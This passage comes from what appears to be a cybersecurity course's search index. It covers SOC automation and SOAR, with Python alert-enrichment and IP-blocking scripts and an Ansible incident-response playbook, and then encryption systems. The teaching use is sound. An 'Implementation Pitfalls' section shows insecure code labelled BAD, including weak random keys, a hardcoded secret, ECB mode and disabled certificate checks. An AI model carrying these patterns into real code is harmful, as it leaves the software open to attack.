connections shell: netstat -tulpn > /tmp/connections.txt - name: Transfer evidence fetch: src: \"{{ item }}\" dest: /evidence/{{ inventory_hostname }}/ flat: yes with_items: - /tmp/memory.dump - /tmp/logs.tar.gz - /tmp/processes.txt - /tmp/connections.txt - name: Clean malware file: path: \"{{ item }}\" state: absent with_items: - /tmp/malware.exe - /etc/cron.d/malicious - name: Harden system include_tasks: hardening.yml - name: Send notification slack: token: \"{{ slack_token }}\" msg: \"Host {{ inventory_hostname }} has been cleaned and hardened\" channel: '#security-ops' - name: Update firewall rules hosts: firewall tasks: - name: Block malicious IPs command: > iptables -I INPUT 1 -s {{ item }} -j DROP with_items: \"{{ malicious_ips }}\" Metrics and KPIs Key Metrics to Track Detection metrics: - Mean Time to Detect (MTTD) - Alert volume - False positive rate - Detection accuracy Response metrics: - Mean Time to Respond (MTTR) - Mean Time to Contain (MTTC) - Mean Time to Recover - Automation rate (% automated) Efficiency metrics: - Alerts triaged automatically - Time saved per alert - Cost per investigation - Analyst productivity Example dashboard: Security Operations Dashboard Alerts Today: 8,432 Automated: 7,891 (94%) Analyst Review: 541 (6%) Current Incidents: 12 Critical: 2 High: 5 Medium: 5 MTTR: 45 minutes (target: < 60 min) MTTD: 12 minutes (target: < 15 min) Top Alert Sources: 1. Failed Login Attempts (3,221) 2. Malware Detection (2,104) 3. Port Scans (1,876) 4. Data Exfiltration (892) 5. Privilege Escalation (339) Best Practices Automation Guidelines Start small: - Pick high-volume, low-complexity tasks - Automate alert enrichment first - Gradually increase automation Test thoroughly: - Test in lab environment - Peer review automation logic - Have rollback plan - Document everything Human in the loop: - Require approval for critical actions - Analyst can override automation - Review automated decisions regularly Continuous improvement: - Track automation effectiveness - Adjust based on feedback - Update playbooks regularly - Share lessons learned Common Pitfalls Over-automation: - Automating complex decisions too early - No human oversight on critical actions - Brittle automation that breaks often Under-documentation: - No runbooks for automation - Undocumented integrations - No change management Ignoring false positives: - Automation amplifies bad detection logic - Creates alert fatigue - Wastes resources Poor error handling: - Automation fails silently - No alerts on automation failures - No fallback to manual process Key Takeaways Automation benefits: - Faster response times - Consistent quality - Free analysts for complex work - Scale without adding headcount - Reduce human error Start with: - Alert enrichment - Simple containment actions - Reporting automation - Progress to complex playbooks Success factors: - Executive support - Cross-team collaboration - Proper tooling - Training and documentation - Continuous improvement Remember: - Automation is journey, not destination - Start small, grow gradually - Measure everything - Keep human in the loop - Continuously improve Security automation transforms SOC operations from reactive firefighting to proactive threat hunting. Done right, it makes teams more effective, analysts happier, and organizations more secure.","title":"Lesson 10.3"},{"location":"LECTURES/unit10/lesson10-3/#security-automation-and-soar","text":"Security operations centers (SOCs) are overwhelmed with alerts. Automation is no longer optional\u2014it's essential. This lesson covers security automation, orchestration, and SOAR (Security Orchestration, Automation, and Response) platforms.","title":"Security Automation and SOAR"},{"location":"LECTURES/unit10/lesson10-3/#the-case-for-automation","text":"","title":"The Case for Automation"},{"location":"LECTURES/unit10/lesson10-3/#the-alert-fatigue-problem","text":"Typical SOC challenges: - 10,000+ alerts per day - 99% are false positives or low priority - Analysts spend 80% of time on repetitive tasks - Average time to investigate: 3-5 hours - Critical threats get lost in noise - Analyst burnout and turnover What automation solves: - Triage alerts automatically - Enrich with threat intelligence - Execute standard response actions - Document everything - Free analysts for complex investigations","title":"The Alert Fatigue Problem"},{"location":"LECTURES/unit10/lesson10-3/#roi-of-automation","text":"Cost savings: Manual investigation: 3 hours \u00d7 $50/hour = $150 Automated triage: 5 minutes \u00d7 $50/hour = $4.17 Savings per alert: $145.83 With 1,000 alerts/day: Annual savings: $145.83 \u00d7 1000 \u00d7 365 = $53+ million Efficiency gains: - Respond in seconds vs. hours - Consistent response quality - 24/7 operation - Scale without hiring","title":"ROI of Automation"},{"location":"LECTURES/unit10/lesson10-3/#security-automation-basics","text":"","title":"Security Automation Basics"},{"location":"LECTURES/unit10/lesson10-3/#types-of-automation","text":"Alert enrichment: - IP reputation lookup - Domain age check - VirusTotal scan - WHOIS lookup - Geolocation - Historical activity Containment actions: - Block IP at firewall - Disable user account - Isolate infected host - Quarantine email - Reset password Investigation automation: - Query logs automatically - Correlate events - Extract IOCs - Search threat intel - Generate timeline Response orchestration: - Create ticket - Send notifications - Execute playbooks - Update case management - Generate reports","title":"Types of Automation"},{"location":"LECTURES/unit10/lesson10-3/#automation-pyramid","text":"Level 4: Full Automation (autonomous response) \u2191 Level 3: Orchestration (multi-tool workflows) \u2191 Level 2: Scripting (single-tool automation) \u2191 Level 1: Manual (analyst does everything) Start at Level 2, progress to Level 4.","title":"Automation Pyramid"},{"location":"LECTURES/unit10/lesson10-3/#scripting-for-security","text":"","title":"Scripting for Security"},{"location":"LECTURES/unit10/lesson10-3/#python-security-automation","text":"Example: Automated alert enrichment #!/usr/bin/env python3 import requests import json class AlertEnricher: def __init__(self, vt_api_key): self.vt_api_key = vt_api_key def check_ip_reputation(self, ip): \"\"\"Check IP against VirusTotal\"\"\" url = f\"https://www.virustotal.com/api/v3/ip_addresses/{ip}\" headers = {\"x-apikey\": self.vt_api_key} response = requests.get(url, headers=headers) if response.status_code == 200: data = response.json() stats = data['data']['attributes']['last_analysis_stats'] return { 'malicious': stats.get('malicious', 0), 'suspicious': stats.get('suspicious', 0), 'total_engines': sum(stats.values()), 'reputation': 'malicious' if stats.get('malicious', 0) > 0 else 'clean' } return None def get_domain_info(self, domain): \"\"\"Get WHOIS and age info\"\"\" import whois try: w = whois.whois(domain) return { 'registrar': w.registrar, 'creation_date': str(w.creation_date), 'expiration_date': str(w.expiration_date), 'age_days': (datetime.now() - w.creation_date).days if w.creation_date else None } except: return None def enrich_alert(self, alert): \"\"\"Enrich alert with contextual information\"\"\" enriched = alert.copy() # Check source IP if 'src_ip' in alert: enriched['src_ip_reputation'] = self.check_ip_reputation(alert['src_ip']) # Check destination IP if 'dst_ip' in alert: enriched['dst_ip_reputation'] = self.check_ip_reputation(alert['dst_ip']) # Check domain if 'domain' in alert: enriched['domain_info'] = self.get_domain_info(alert['domain']) # Calculate risk score enriched['risk_score'] = self.calculate_risk_score(enriched) return enriched def calculate_risk_score(self, alert): \"\"\"Calculate risk score based on enrichment data\"\"\" score = 0 # IP reputation if alert.get('src_ip_reputation', {}).get('malicious', 0) > 0: score += 50 # New domain domain_age = alert.get('domain_info', {}).get('age_days') if domain_age and domain_age < 30: score += 30 # Severity if alert.get('severity') == 'critical': score += 20 return min(score, 100) # Cap at 100 # Usage enricher = AlertEnricher(vt_api_key='your_api_key') alert = { 'id': 'ALT-12345', 'severity': 'high', 'src_ip': '198.51.100.42', 'dst_ip': '203.0.113.10', 'domain': 'suspicious-domain.com' } enriched_alert = enricher.enrich_alert(alert) print(json.dumps(enriched_alert, indent=2))","title":"Python Security Automation"},{"location":"LECTURES/unit10/lesson10-3/#automated-response-actions","text":"Example: Auto-block malicious IPs #!/usr/bin/env python3 import subprocess import logging from datetime import datetime class AutoResponder: def __init__(self, log_file='auto_response.log'): logging.basicConfig( filename=log_file, level=logging.INFO, format='%(asctime)s - %(message)s' ) self.logger = logging def block_ip(self, ip, reason): \"\"\"Block IP at firewall\"\"\" try: # Using iptables cmd = f\"sudo iptables -I INPUT 1 -s {ip} -j DROP\" subprocess.run(cmd.split(), check=True) self.logger.info(f\"BLOCKED IP: {ip} - Reason: {reason}\") # Add to blocklist file with open('/etc/security/blocklist.txt', 'a') as f: f.write(f\"{ip}\\t{datetime.now()}\\t{reason}\\n\") return True except Exception as e: self.logger.error(f\"Failed to block {ip}: {e}\") return False def disable_user_account(self, username, reason): \"\"\"Disable compromised user account\"\"\" try: # Linux subprocess.run(['sudo', 'passwd', '-l', username], check=True) self.logger.info(f\"DISABLED ACCOUNT: {username} - Reason: {reason}\") # Send notification self.send_notification( f\"User account {username} has been disabled due to: {reason}\" ) return True except Exception as e: self.logger.error(f\"Failed to disable {username}: {e}\") return False def isolate_host(self, hostname, reason): \"\"\"Isolate compromised host\"\"\" try: # This would integrate with your network management # Example: modify firewall rules, change VLAN, etc. self.logger.info(f\"ISOLATED HOST: {hostname} - Reason: {reason}\") # Create incident ticket self.create_ticket( title=f\"Host Isolation: {hostname}\", description=f\"Automatically isolated due to: {reason}\", priority='high' ) return True except Exception as e: self.logger.error(f\"Failed to isolate {hostname}: {e}\") return False def send_notification(self, message): \"\"\"Send notification to security team\"\"\" # Integrate with Slack, email, SMS, etc. print(f\"NOTIFICATION: {message}\") def create_ticket(self, title, description, priority): \"\"\"Create incident ticket\"\"\" # Integrate with JIRA, ServiceNow, etc. print(f\"TICKET CREATED: {title} - {priority}\") # Usage responder = AutoResponder() # Automated response to brute force if failed_login_count > 10: responder.block_ip(source_ip, \"Brute force attempt\") responder.create_ticket( title=f\"Brute force from {source_ip}\", description=f\"Blocked after {failed_login_count} failed attempts\", priority='medium' )","title":"Automated Response Actions"},{"location":"LECTURES/unit10/lesson10-3/#soar-platforms","text":"","title":"SOAR Platforms"},{"location":"LECTURES/unit10/lesson10-3/#what-is-soar","text":"Security Orchestration, Automation, and Response Components: 1. Orchestration - Connect multiple tools 2. Automation - Execute actions automatically 3. Response - Standardized playbooks 4. Case Management - Track investigations 5. Threat Intelligence - Integrate feeds Popular SOAR platforms: - Splunk Phantom (now SOAR) - IBM Resilient - Palo Alto Cortex XSOAR - Swimlane - Demisto (acquired by Palo Alto) - TheHive Project (open source)","title":"What is SOAR?"},{"location":"LECTURES/unit10/lesson10-3/#playbooks","text":"Automated response workflows Phishing investigation playbook: 1. Receive phishing alert \u2193 2. Extract email metadata - Sender, subject, attachments - URLs, headers \u2193 3. Enrich indicators - Check URLs against threat intel - Scan attachments with sandbox - Look up sender reputation \u2193 4. Assess risk If malicious: - Quarantine email across organization - Block sender - Add IOCs to blocklist If suspicious: - Flag for analyst review - Request user confirmation If benign: - Release from quarantine - Close case \u2193 5. Document findings - Update case - Generate report - Close ticket Malware detection playbook: 1. Malware detected on endpoint \u2193 2. Gather context - Process tree - Network connections - File hashes \u2193 3. Containment - Isolate host from network - Kill malicious process - Block C2 domain \u2193 4. Analysis - Submit sample to sandbox - Check threat intelligence - Identify IOCs \u2193 5. Hunt for additional infections - Search for IOCs across environment - Check other endpoints \u2193 6. Remediation - Clean or reimage infected hosts - Block identified IOCs - Update signatures \u2193 7. Recovery - Restore from backup if needed - Verify system clean - Return to production","title":"Playbooks"},{"location":"LECTURES/unit10/lesson10-3/#integrations","text":"Common integrations: SIEM: - Splunk - Elastic - QRadar - ArcSight EDR: - CrowdStrike - Carbon Black - SentinelOne - Microsoft Defender Firewall: - Palo Alto - Fortinet - Cisco - pfSense Threat Intelligence: - VirusTotal - AlienVault OTX - MISP - ThreatConnect Ticketing: - ServiceNow - JIRA - Remedy - Zendesk Communication: - Slack - Microsoft Teams - Email - SMS","title":"Integrations"},{"location":"LECTURES/unit10/lesson10-3/#building-custom-automation","text":"","title":"Building Custom Automation"},{"location":"LECTURES/unit10/lesson10-3/#thehive-cortex-example","text":"Open-source SOAR platform Architecture: TheHive (Case Management) \u2195 Cortex (Analyzers & Responders) \u2195 External Services (VirusTotal, MISP, etc.) Creating custom analyzer: #!/usr/bin/env python3 from cortexutils.analyzer import Analyzer class CustomIPAnalyzer(Analyzer): def __init__(self): Analyzer.__init__(self) self.api_key = self.get_param('config.api_key', None, 'API key is missing') def summary(self, raw): \"\"\"Generate summary for TheHive\"\"\" taxonomies = [] level = \"info\" namespace = \"CustomAnalyzer\" predicate = \"Reputation\" if raw['reputation'] == 'malicious': level = \"malicious\" value = \"Malicious\" else: value = \"Clean\" taxonomies.append(self.build_taxonomy(level, namespace, predicate, value)) return {\"taxonomies\": taxonomies} def run(self): \"\"\"Main analysis logic\"\"\" if self.data_type == 'ip': ip = self.get_data() # Your analysis logic here result = { 'ip': ip, 'reputation': self.check_reputation(ip), 'threat_score': self.calculate_threat_score(ip), 'sources': self.query_threat_feeds(ip) } self.report(result) else: self.error('Invalid data type') def check_reputation(self, ip): # Implementation pass def calculate_threat_score(self, ip): # Implementation pass def query_threat_feeds(self, ip): # Implementation pass if __name__ == '__main__': CustomIPAnalyzer().run()","title":"TheHive + Cortex Example"},{"location":"LECTURES/unit10/lesson10-3/#ansible-for-security-automation","text":"Playbook for incident response: --- - name: Incident Response Playbook hosts: affected_hosts become: yes tasks: - name: Isolate host from network command: ifconfig eth0 down register: isolation_result - name: Kill malicious process shell: pkill -9 -f \"{{ malicious_process }}\" ignore_errors: yes - name: Collect evidence block: - name: Dump memory command: lime-dump /tmp/memory.dump - name: Collect logs archive: path: - /var/log/syslog - /var/log/auth.log dest: /tmp/logs.tar.gz - name: List processes shell: ps aux > /tmp/processes.txt - name: List network connections shell: netstat -tulpn > /tmp/connections.txt - name: Transfer evidence fetch: src: \"{{ item }}\" dest: /evidence/{{ inventory_hostname }}/ flat: yes with_items: - /tmp/memory.dump - /tmp/logs.tar.gz - /tmp/processes.txt - /tmp/connections.txt - name: Clean malware file: path: \"{{ item }}\" state: absent with_items: - /tmp/malware.exe - /etc/cron.d/malicious - name: Harden system include_tasks: hardening.yml - name: Send notification slack: token: \"{{ slack_token }}\" msg: \"Host {{ inventory_hostname }} has been cleaned and hardened\" channel: '#security-ops' - name: Update firewall rules hosts: firewall tasks: - name: Block malicious IPs command: > iptables -I INPUT 1 -s {{ item }} -j DROP with_items: \"{{ malicious_ips }}\"","title":"Ansible for Security Automation"},{"location":"LECTURES/unit10/lesson10-3/#metrics-and-kpis","text":"","title":"Metrics and KPIs"},{"location":"LECTURES/unit10/lesson10-3/#key-metrics-to-track","text":"Detection metrics: - Mean Time to Detect (MTTD) - Alert volume - False positive rate - Detection accuracy Response metrics: - Mean Time to Respond (MTTR) - Mean Time to Contain (MTTC) - Mean Time to Recover - Automation rate (% automated) Efficiency metrics: - Alerts triaged automatically - Time saved per alert - Cost per investigation - Analyst productivity Example dashboard: Security Operations Dashboard Alerts Today: 8,432 Automated: 7,891 (94%) Analyst Review: 541 (6%) Current Incidents: 12 Critical: 2 High: 5 Medium: 5 MTTR: 45 minutes (target: < 60 min) MTTD: 12 minutes (target: < 15 min) Top Alert Sources: 1. Failed Login Attempts (3,221) 2. Malware Detection (2,104) 3. Port Scans (1,876) 4. Data Exfiltration (892) 5. Privilege Escalation (339)","title":"Key Metrics to Track"},{"location":"LECTURES/unit10/lesson10-3/#best-practices","text":"","title":"Best Practices"},{"location":"LECTURES/unit10/lesson10-3/#automation-guidelines","text":"Start small: - Pick high-volume, low-complexity tasks - Automate alert enrichment first - Gradually increase automation Test thoroughly: - Test in lab environment - Peer review automation logic - Have rollback plan - Document everything Human in the loop: - Require approval for critical actions - Analyst can override automation - Review automated decisions regularly Continuous improvement: - Track automation effectiveness - Adjust based on feedback - Update playbooks regularly - Share lessons learned","title":"Automation Guidelines"},{"location":"LECTURES/unit10/lesson10-3/#common-pitfalls","text":"Over-automation: - Automating complex decisions too early - No human oversight on critical actions - Brittle automation that breaks often Under-documentation: - No runbooks for automation - Undocumented integrations - No change management Ignoring false positives: - Automation amplifies bad detection logic - Creates alert fatigue - Wastes resources Poor error handling: - Automation fails silently - No alerts on automation failures - No fallback to manual process","title":"Common Pitfalls"},{"location":"LECTURES/unit10/lesson10-3/#key-takeaways","text":"Automation benefits: - Faster response times - Consistent quality - Free analysts for complex work - Scale without adding headcount - Reduce human error Start with: - Alert enrichment - Simple containment actions - Reporting automation - Progress to complex playbooks Success factors: - Executive support - Cross-team collaboration - Proper tooling - Training and documentation - Continuous improvement Remember: - Automation is journey, not destination - Start small, grow gradually - Measure everything - Keep human in the loop - Continuously improve Security automation transforms SOC operations from reactive firefighting to proactive threat hunting. Done right, it makes teams more effective, analysts happier, and organizations more secure.","title":"Key Takeaways"},{"location":"LECTURES/unit11/lesson11-1/","text":"Encryption Systems We've covered cryptographic concepts earlier, but now let's dive deeper into how encryption systems work in practice. This lesson examines real-world encryption implementations, protocols, and technologies that protect data in modern computing. Understanding Encryption Systems An encryption system is the complete infrastructure for securing data, including: - Encryption algorithms - Key management - Protocols - Implementation - Policies and procedures It's not just about the math\u2014it's about the entire ecosystem. Transport Layer Security (TLS) TLS (formerly SSL) is the foundation of secure internet communication. Every HTTPS website uses TLS. TLS Handshake Process When you visit https://example.com, here's what happens: 1. Client Hello - Client sends: TLS version, supported cipher suites, random number - Example cipher suite: TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 2. Server Hello - Server responds: Chosen cipher suite, random number - Server sends certificate (public key + identity) 3. Certificate Verification - Client validates certificate chain - Checks: CA signature, expiration, revocation status, domain name 4. Key Exchange Using chosen method (e.g., ECDHE - Elliptic Curve Diffie-Hellman Ephemeral): - Client and server compute shared secret - This becomes the symmetric key 5. Finished Messages - Both sides send encrypted confirmation - Handshake complete 6. Application Data - All subsequent traffic encrypted with AES (or chosen symmetric cipher) - Fast symmetric encryption for bulk data - Keys unique to this session TLS Versions SSL 2.0 / 3.0 : DEPRECATED - broken, do not use TLS 1.0 / 1.1 : DEPRECATED - vulnerable, being phased out TLS 1.2 : Current standard, widely supported TLS 1.3 : Latest version, faster and more secure TLS 1.3 improvements: - Fewer cipher suites (removed weak options) - Faster handshake (0-RTT mode) - Forward secrecy by default - Simplified protocol Certificate Authorities and PKI Certificate : Digital document binding public key to identity Contents: - Subject (domain name, organization) - Issuer (CA that signed it) - Validity period - Public key - Signature (CA's private key) Certificate chain: Root CA (in browser trust store) \u2193 Intermediate CA \u2193 End-entity certificate (example.com) Validation process: 1. Browser receives certificate 2. Checks signature from Intermediate CA 3. Checks Intermediate CA signed by Root CA 4. Root CA in browser's trust store? \u2192 Valid! Certificate types: - DV (Domain Validated) : Proves domain ownership only - OV (Organization Validated) : Verifies organization identity - EV (Extended Validation) : Strictest verification (shows green bar) Certificate revocation: - CRL (Certificate Revocation List) : Published list of revoked certificates - OCSP (Online Certificate Status Protocol) : Real-time status check - OCSP Stapling : Server provides OCSP response, reduces latency Perfect Forward Secrecy (PFS) Problem : If server's private key is compromised, attacker can decrypt past traffic. Solution : Ephemeral key exchange (DHE, ECDHE) - Session keys derived from temporary keys - Temporary keys discarded after session - Compromise of server key doesn't compromise past sessions Cipher suites with PFS: - TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 \u2713 - TLS_RSA_WITH_AES_256_GCM_SHA384 \u2717 (no PFS) TLS Best Practices Configuration: # Disable old versions ssl_protocols TLSv1.2 TLSv1.3; # Strong cipher suites only ssl_ciphers 'ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384'; # Prefer server cipher suite order ssl_prefer_server_ciphers on; # HSTS (force HTTPS) add_header Strict-Transport-Security \"max-age=31536000; includeSubDomains\" always; # OCSP stapling ssl_stapling on; ssl_stapling_verify on; Testing: - SSL Labs Server Test (ssllabs.com/ssltest) - Check cipher suite support - Verify certificate chain - Test for vulnerabilities VPN Technologies Virtual Private Networks create encrypted tunnels over untrusted networks. IPsec IPsec (Internet Protocol Security) secures IP communications. Modes: - Transport mode : Encrypts payload only, original IP header intact - Tunnel mode : Encrypts entire packet, new IP header added Protocols: - AH (Authentication Header) : Authentication and integrity, no encryption - ESP (Encapsulating Security Payload) : Authentication, integrity, and encryption Key exchange: - IKE (Internet Key Exchange) : Establishes security associations (SAs) - Phase 1: Establish secure channel - Phase 2: Negotiate IPsec parameters Use cases: - Site-to-site VPNs (connecting branch offices) - Remote access VPNs - Securing cloud connections OpenVPN Open-source VPN using SSL/TLS. Advantages: - Highly configurable - Works over TCP or UDP - Bypasses most firewalls - Strong encryption (AES-256) - Cross-platform Configuration example: # Server config port 1194 proto udp dev tun ca ca.crt cert server.crt key server.key dh dh2048.pem server 10.8.0.0 255.255.255.0 cipher AES-256-CBC auth SHA256 WireGuard Modern VPN protocol, simpler and faster than OpenVPN or IPsec. Features: - Minimal codebase (~4,000 lines vs. OpenVPN's ~100,000) - Modern cryptography (Curve25519, ChaCha20, Poly1305) - Fast performance - Built into Linux kernel Configuration: [Interface] PrivateKey = <private_key> Address = 10.0.0.1/24 ListenPort = 51820 [Peer] PublicKey = <peer_public_key> AllowedIPs = 10.0.0.2/32 Use cases: - Point-to-point VPNs - Simple site-to-site connections - Mobile VPN clients VPN Protocols Comparison Protocol Speed Security Complexity Best For IPsec Medium High High Site-to-site OpenVPN Medium High Medium General purpose WireGuard Fast High Low Modern implementations L2TP/IPsec Slow Medium Medium Legacy compatibility PPTP Fast Low Low Don't use Disk Encryption Protecting data at rest. Full Disk Encryption (FDE) Encrypts entire disk, transparent to user after boot. BitLocker (Windows): # Enable BitLocker Enable-BitLocker -MountPoint \"C:\" -EncryptionMethod Aes256 -UsedSpaceOnly # Backup recovery key Backup-BitLockerKeyProtector -MountPoint \"C:\" -KeyProtectorId $KeyProtectorId FileVault (macOS): - System Preferences \u2192 Security & Privacy \u2192 FileVault - Recovery key backed up to iCloud or stored locally LUKS (Linux): # Create encrypted partition cryptsetup luksFormat /dev/sdb1 # Open encrypted partition cryptsetup luksOpen /dev/sdb1 encrypted_volume # Format and mount mkfs.ext4 /dev/mapper/encrypted_volume mount /dev/mapper/encrypted_volume /mnt/encrypted Self-Encrypting Drives (SEDs) Hardware-based encryption in the drive itself. Advantages: - No performance impact - Encryption always on - Instant secure erase (destroy key) - OS-independent Standards: - TCG Opal - eDrive (Microsoft) Considerations: - Trust the manufacturer - Firmware vulnerabilities possible - Key stored on drive File/Folder Encryption Encrypt specific files or folders. Tools: - GPG : Command-line encryption # Encrypt file gpg --encrypt --recipient user@example.com file.txt # Decrypt file gpg --decrypt file.txt.gpg > file.txt VeraCrypt : Encrypted containers and partitions 7-Zip : Encrypted archives AxCrypt : User-friendly file encryption Email Encryption Email is inherently insecure (travels through multiple servers, stored unencrypted). S/MIME S/MIME (Secure/Multipurpose Internet Mail Extensions) uses certificates. How it works: 1. Obtain S/MIME certificate from CA 2. Install in email client 3. Send digitally signed emails (proves sender) 4. Encrypt emails with recipient's public key Advantages: - Built into most email clients - Centralized certificate management - Corporate PKI integration Disadvantages: - Requires certificate from CA (cost) - Recipients need certificates too PGP/GPG PGP (Pretty Good Privacy) / GPG (GNU Privacy Guard) use web of trust model. How it works: 1. Generate key pair gpg --gen-key Share public key gpg --export --armor user@example.com > public_key.asc Encrypt email gpg --encrypt --recipient recipient@example.com message.txt Web of Trust: - No central authority - Users sign each other's keys - Trust based on signatures Advantages: - Free and open source - No dependence on CAs - Strong community Disadvantages: - Complex for non-technical users - Key management challenges - Not widely adopted End-to-End Encryption (E2EE) Messages encrypted on sender's device, decrypted only on recipient's device. Service provider can't read them. Signal Protocol Used by Signal, WhatsApp, Facebook Messenger (secret conversations). Features: - Double Ratchet Algorithm : Keys constantly change - Forward secrecy : Past messages safe if keys compromised - Future secrecy : Future messages safe too - Deniability : Can't prove who sent message How it works: 1. Initial key exchange (using identity keys) 2. Each message uses ephemeral keys 3. Keys \"ratchet\" forward after each message 4. Old keys destroyed Security properties: - End-to-end encryption - Authentication (know who you're talking to) - Forward secrecy - Break-in recovery (compromise is temporary) Other E2EE Systems Matrix/Element: - Decentralized messaging - End-to-end encryption - Open protocol Telegram (Secret Chats): - MTProto protocol - Optional E2EE (not default) - Device-specific (no cloud sync) iMessage: - Apple's E2EE messaging - Seamless user experience - Closed-source Blockchain and Cryptocurrency Cryptography enables decentralized trustless systems. Bitcoin Fundamentals Public/Private Keys: - Private key: Random 256-bit number (keep secret!) - Public key: Derived from private key (elliptic curve cryptography) - Address: Hash of public key (what you share) Transaction signing: 1. Create transaction (sending Bitcoin) 2. Hash transaction data 3. Sign hash with private key (ECDSA) 4. Broadcast transaction + signature 5. Network verifies signature with public key Blockchain: - Chain of blocks - Each block contains: - Transactions - Timestamp - Hash of previous block - Nonce (for mining) Mining (Proof of Work): Hash(Block Data + Nonce) must be < Target Miners try different nonces First to find valid hash wins block reward Difficulty adjusts to maintain ~10 min block time Security: - Immutability (changing past blocks requires recalculating all subsequent blocks) - Consensus (longest chain is truth) - 51% attack would require more computing power than rest of network Ethereum and Smart Contracts Smart contracts : Programs on blockchain Example simple contract: contract SimpleStorage { uint storedData; function set(uint x) public { storedData = x; } function get() public view returns (uint) { return storedData; } } Cryptographic elements: - Same public/private key cryptography as Bitcoin - Transactions signed with private key - Contract code executed by all nodes - State changes recorded on blockchain Quantum-Resistant Cryptography Quantum computers threaten current cryptography: What's at Risk? RSA and ECC : Shor's algorithm can break these on quantum computers Symmetric encryption : Grover's algorithm speeds up brute force, but doubling key size mitigates risk - AES-128 \u2192 AES-256 remains secure Post-Quantum Algorithms NIST is standardizing new algorithms: Lattice-based: - CRYSTALS-Kyber (key exchange) - CRYSTALS-Dilithium (digital signatures) Hash-based: - SPHINCS+ (digital signatures) Code-based: - Classic McEliece (key exchange) Migration timeline: - Standards published: 2024 - Implementation: 2025-2030 - Full migration: 2030s Preparation: - Use crypto-agility (easy to swap algorithms) - Monitor quantum computing progress - Plan migration strategy Hardware Security Modules (HSMs) Physical devices that safeguard cryptographic keys. Features: - Tamper-resistant hardware - Key generation in secure environment - Keys never leave device - FIPS 140-2/140-3 certified Use cases: - Certificate authorities - Payment processing - Code signing - Database encryption keys - Cryptocurrency exchanges Types: - General-purpose HSMs : Thales, Utimaco - Cloud HSMs : AWS CloudHSM, Azure Dedicated HSM - Payment HSMs : Specialized for financial transactions Trusted Platform Module (TPM) Microchip on motherboard providing hardware-based security. Functions: - Secure key storage - Random number generation - Platform integrity measurement - Attestation (prove system state) Uses: - BitLocker encryption - Secure boot - Device authentication - Protection of encryption keys TPM 2.0: - Current standard - Algorithm agility - Better performance - Required for Windows 11 Secure Enclaves Isolated execution environments within CPUs. Intel SGX (Software Guard Extensions): - Encrypted memory regions (enclaves) - Code and data protected from OS and hypervisor - Remote attestation ARM TrustZone: - Separate secure world - Used in mobile devices - Fingerprint data, secure payments Apple Secure Enclave: - Dedicated processor - Stores biometric data - Manages encryption keys Key Management Best Practices Key Lifecycle 1. Generation: - Use cryptographically secure random number generators - Generate keys in secure environment - Adequate key length 2. Storage: - Encrypt keys (key encryption keys) - Use HSMs for critical keys - Access control - Audit logging 3. Distribution: - Secure key exchange protocols - Out-of-band verification - Split knowledge (no single person has full key) 4. Usage: - Limit key lifetime - Usage restrictions (what can key be used for) - Rate limiting 5. Rotation: - Regular key rotation - Re-encrypt data with new keys - Overlap period (old and new keys both valid) 6. Destruction: - Secure deletion (overwrite) - Destroy all copies - Document destruction Key Escrow and Recovery Problem : What if keys are lost? Solutions: Key Escrow: - Trusted third party holds key copy - Strict controls on access - Used in some enterprise settings M-of-N: - Key split into N parts - M parts needed to reconstruct - Example: 3-of-5 (any 3 of 5 people can recover) Secret Sharing (Shamir): - Mathematical scheme for splitting secrets - Threshold scheme (need minimum shares) Considerations: - Recovery vs. security trade-off - Compliance requirements - User trust Cryptographic Protocols in Practice SSH (Secure Shell) Remote access with strong authentication and encryption. Key-based authentication: # Generate key pair ssh-keygen -t ed25519 # Copy public key to server ssh-copy-id user@server # Connect (no password needed) ssh user@server SSH tunneling: # Local port forwarding ssh -L 8080:localhost:80 user@server # Dynamic port forwarding (SOCKS proxy) ssh -D 1080 user@server Best practices: - Disable password authentication - Use strong key types (ed25519, rsa 4096) - Regularly rotate keys - Monitor authorized_keys files Tor (The Onion Router) Anonymous communication using layered encryption. How it works: User \u2192 Entry Node \u2192 Middle Node \u2192 Exit Node \u2192 Destination Each layer encrypted separately: - Exit node sees traffic to destination (no source) - Entry node sees source (no destination) - Middle node sees neither Uses: - Anonymous browsing - Censorship circumvention - Whistleblowing - Privacy protection Limitations: - Slow (multiple hops) - Exit node can see unencrypted traffic - Timing attacks possible - Not foolproof anonymity Implementation Pitfalls Common mistakes that weaken encryption systems: 1. Weak Random Number Generation # BAD import random key = random.randint(0, 2**256) # GOOD import secrets key = secrets.randbelow(2**256) 2. Improper Key Storage # BAD API_KEY = \"secret123\" # Hardcoded in source # BETTER API_KEY = os.environ.get('API_KEY') # Environment variable # BEST # Use key management service (AWS KMS, Azure Key Vault, HashiCorp Vault) 3. ECB Mode # BAD - patterns visible in ciphertext cipher = AES.new(key, AES.MODE_ECB) # GOOD - use authenticated encryption cipher = AES.new(key, AES.MODE_GCM, nonce=nonce) 4. Not Verifying Certificates # BAD - disables certificate verification requests.get('https://example.com', verify=False) # GOOD - verify by default requests.get('https://example.com') 5. Custom Cryptography Never roll your own crypto Use established libraries: OpenSSL, libsodium, cryptography.io Implement standard algorithms correctly Get expert review for custom protocols Conclusion Encryption systems are complex but essential: Key principles: 1. Use standard algorithms : Don't create your own 2. Key management is critical : Keys are more valuable than data 3. Defense in depth : Encryption is one layer 4. Implementation matters : Correct use of cryptography is crucial 5. Stay current : Threats evolve, so must defenses Practical takeaways: - Use TLS 1.3 for web traffic - Enable full disk encryption - Use E2EE messaging (Signal protocol) - Implement proper key management - Plan for post-quantum migration Remember : Cryptography is a tool. Strong cryptography used incorrectly provides false security. Proper implementation, key management, and security architecture are equally important. The goal isn't just to encrypt\u2014it's to protect confidentiality, integrity, and authenticity in a way that's practical, maintainable, and resilient against evolving threats. You've now completed the cybersecurity curriculum. You understand systems from the ground up\u2014from CPU rings to encryption protocols. You know how attackers think and how defenders respond. Most importantly, you understand the ethical responsibilities that come with this knowledge. The field of cybersecurity is constantly evolving. Continue learning, practicing, and contributing to a more secure digital world.","title":"Lesson 11.1"},{"location":"LECTURES/unit11/lesson11-1/#encryption-systems","text":"We've covered cryptographic concepts earlier, but now let's dive deeper into how encryption systems work in practice. This lesson examines real-world encryption implementations, protocols, and technologies that protect data in modern computing.","title":"Encryption Systems"},{"location":"LECTURES/unit11/lesson11-1/#understanding-encryption-systems","text":"An encryption system is the complete infrastructure for securing data, including: - Encryption algorithms - Key management - Protocols - Implementation - Policies and procedures It's not 